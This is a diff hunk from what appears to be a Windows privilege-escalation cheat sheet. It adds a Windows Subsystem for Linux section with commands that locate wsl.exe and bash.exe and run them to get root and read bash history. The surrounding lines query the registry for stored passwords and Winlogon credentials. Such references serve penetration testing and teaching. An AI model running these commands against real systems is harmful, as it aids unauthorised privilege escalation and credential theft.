@@ -1500,6 +1500,15 @@ netsh firewall show config
 #Stored Password
 reg query HKLM /f password /t REG_SZ /s
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+# Windows Sub Syetm For Linux (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+where /R c:\windows wsl.exe
+where /R c:\windows bash.exe
+# FInd the path of wsl and bash
+c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe whoami # Will get root
+c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
+hostname # You will get name of the host, check for bash history
+
 ```
 
 ## Manual Enumeration commands
